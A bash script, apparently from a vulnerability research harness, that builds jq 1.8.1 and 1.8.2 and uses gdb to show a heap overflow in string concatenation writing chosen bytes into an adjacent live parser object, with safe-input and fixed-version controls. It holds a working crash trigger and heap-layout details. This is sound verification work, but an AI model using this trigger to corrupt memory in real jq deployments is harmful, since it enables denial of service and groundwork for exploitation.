#!/bin/bash
# jq2shell live heap neighbour map (2026-11-23).
#
# Real glibc allocator, plain pinned jq 1.8.1/1.8.2 (no ASan). Stops under gdb
# where the wrapped jvp_string_append allocates the undersized 49-byte string
# (allocsz 32), then lets the real ~1 GiB memcpy run to its natural SIGSEGV and
# reads the bytes it left in the adjacent live object. The expression uses the
# refcount alias so only ~1 GiB of physical string is needed, inside the wake
# cgroup guard. Controls: fixed 1.8.2 rejects; small alias input stays clean.
#
# This is rung-4/live-process mechanics: chosen bytes at chosen offsets in a
# live heap object, observed under gdb. There is no request/wire input, no
# control-flow diversion, no command or side effect, hence no rung 5 claim.
set -eu
cd "$(dirname "$0")/.."
ROOT=$PWD
BUILD=$ROOT/build/heapmap
OUT=$ROOT/live/evidence
mkdir -p "$BUILD" "$OUT"
export LC_ALL=C

CG=/sys/fs/cgroup$(sed -n 's/^0:://p' /proc/self/cgroup)
{
  for key in memory.max memory.high; do
    echo "$key=$(cat "$CG/$key" 2>/dev/null || echo UNKNOWN)"
  done
  echo "memory.current=VARIES"
} > "$OUT/heapmap-guard.out"

# Plain pinned build: no --enable-asan, -O0 for stable gdb line breakpoints.
build_plain() {
  ver=$1
  tree=$BUILD/jq-jq-$ver
  if [ ! -x "$tree/.libs/jq" ]; then
    tar xzf "$ROOT/src/jq-$ver.tar.gz" -C "$BUILD"
    (
      cd "$tree"
      autoreconf -i > "$BUILD/heapmap-autoreconf-$ver.log" 2>&1
      ./configure --disable-maintainer-mode --with-oniguruma=/usr \
        CFLAGS='-g -O0 -fno-omit-frame-pointer' \
        > "$BUILD/heapmap-configure-$ver.log" 2>&1
      make -j2 > "$BUILD/heapmap-make-$ver.log" 2>&1
    )
  fi
  test -x "$tree/.libs/jq"
  if ldd "$tree/.libs/jq" | grep -q libasan; then
    echo "plain build unexpectedly ASan: $ver" >&2
    exit 1
  fi
  echo "$ver $(sha256sum "$tree/.libs/jq" | cut -d' ' -f1)" \
    > "$OUT/heapmap-binary-$ver.sha256"
}

build_plain 1.8.1
build_plain 1.8.2

VULN=$BUILD/jq-jq-1.8.1
FIXED=$BUILD/jq-jq-1.8.2
PAT='("ABCD"*268435456) as $s | ($s+$s) | length'

# Vulnerable: identify the 208-byte neighbour, capture arithmetic, let the
# real copy fault, then read the bytes left in the neighbour. No `continue`
# past the fault; gdb kills the inferior before any second run.
cat > "$BUILD/heapmap-gdb-vuln.cmd" <<'EOF'
set pagination off
set confirm off
set breakpoint pending on
break src/jv_alloc.c:143 if sz == 208
commands
silent
printf "NEIGHBOUR p=%p request=%u\n", p, sz
bt 4
continue
end
break src/jv.c:1190 if currlen == 1073741824
commands
silent
set $news = news
printf "APPEND news=%p data=%p currlen=%u len=%u allocsz=%u\n", news, news->data, currlen, len, allocsz
printf "ADJACENT user=%p chunk_size=%lu\n", (char*)news+64, *(unsigned long*)((char*)news+56)
continue
end
catch signal SIGSEGV
commands
silent
printf "FAULT address=%p rip=%p\n", $_siginfo._sifields._sigfault.si_addr, $rip
printf "NEIGHBOUR_BYTES_BEGIN\n"
x/64bx (char*)$news+64
printf "NEIGHBOUR_BYTES_END\n"
end
run -n '("ABCD"*268435456) as $s | ($s+$s) | length'
kill
quit
EOF
(cd "$VULN" && LD_LIBRARY_PATH=.libs timeout 180s \
  gdb -q -batch -x "$BUILD/heapmap-gdb-vuln.cmd" --args ./.libs/jq) \
  > "$BUILD/heapmap-vuln.raw" 2>&1

# Normalize addresses only (byte values are one or two hex digits).
norm() {
  sed -E \
    -e 's/0x[0-9a-f]{6,}/0xADDR/g' \
    -e 's/0x[0-9a-f]+:/0xADDR:/g' \
    -e 's/process [0-9]+/process PID/g' \
    -e '/^\[Thread debugging/d' \
    -e '/^Using host libthread_db/d' \
    -e '/^No source file named/d' \
    -e '/^Breakpoint [0-9]*/d' \
    -e '/^Catchpoint [0-9]*/d' \
    -e '/^\[Inferior /d'
}
norm < "$BUILD/heapmap-vuln.raw" > "$OUT/heapmap-vuln.out"
grep -q '^NEIGHBOUR p=0xADDR request=208$' "$OUT/heapmap-vuln.out"
grep -q 'jv_parser_new (flags=0) at src/jv_parse.c:711' "$OUT/heapmap-vuln.out"
grep -q '^APPEND news=0xADDR data=0xADDR currlen=1073741824 len=1073741824 allocsz=32$' \
  "$OUT/heapmap-vuln.out"
grep -q '^ADJACENT user=0xADDR chunk_size=225$' "$OUT/heapmap-vuln.out"
grep -q '^FAULT address=0xADDR rip=0xADDR$' "$OUT/heapmap-vuln.out"
grep -q '^0xADDR:[[:space:]]*0x41[[:space:]]0x42[[:space:]]0x43[[:space:]]0x44' \
  "$OUT/heapmap-vuln.out"

# Safe input control: same alias shape, small string, vulnerable binary.
cat > "$BUILD/heapmap-gdb-safe.cmd" <<'EOF'
set pagination off
set confirm off
set breakpoint pending on
break src/jv.c:1183 if currlen == 1000
commands
silent
printf "SAFE-FASTPATH currlen=%u len=%u\n", currlen, len
continue
end
break src/jv.c:1190 if currlen == 1000
commands
silent
printf "SAFE-SLOWPATH currlen=%u len=%u allocsz=%u\n", currlen, len, allocsz
continue
end
run -n '("x"*1000) as $s | ($s+$s) | length'
EOF
safe=$(cd "$VULN" && LD_LIBRARY_PATH=.libs timeout 60s \
  gdb -q -batch -x "$BUILD/heapmap-gdb-safe.cmd" --args ./.libs/jq \
  | grep -E '^(SAFE-|2000$)' | norm)
printf '%s\n' "$safe" > "$OUT/heapmap-safe.out"
grep -q '^SAFE-SLOWPATH currlen=1000 len=1000 allocsz=4000$' "$OUT/heapmap-safe.out"
grep -q '^2000$' "$OUT/heapmap-safe.out"

# Fixed control: 1.8.2 rejects the same geometry before allocating.
set +e
fixmsg=$(cd "$FIXED" && LD_LIBRARY_PATH=.libs timeout 120s ./.libs/jq -n "$PAT" 2>&1)
fix_rc=$?
set -e
test "$fix_rc" = 5
test "$fixmsg" = 'jq: error (at <unknown>): String too long'

{
  echo "VULN neighbour=208-byte-struct-jv_parser from jv_parse.c:711 <- main.c:652"
  echo "VULN malloc request=49 (jvp_string allocsz=32), glibc chunk=64, next chunk=224"
  echo "VULN adjacent live object at data+48; next chunk size field at data+40"
  echo "VULN real 1 GiB copy wrote pattern ABCD at chosen offsets in neighbour"
  echo "VULN fault at heap mapping end; no code runs between overwrite and fault"
  echo "SAFE rc=0 output=2000 allocsz=4000 fast-path not taken"
  echo "FIXED rc=$fix_rc msg=$fixmsg"
} > "$OUT/heapmap-summary.out"

cat "$OUT/heapmap-summary.out"
echo HEAPMAP-PASS
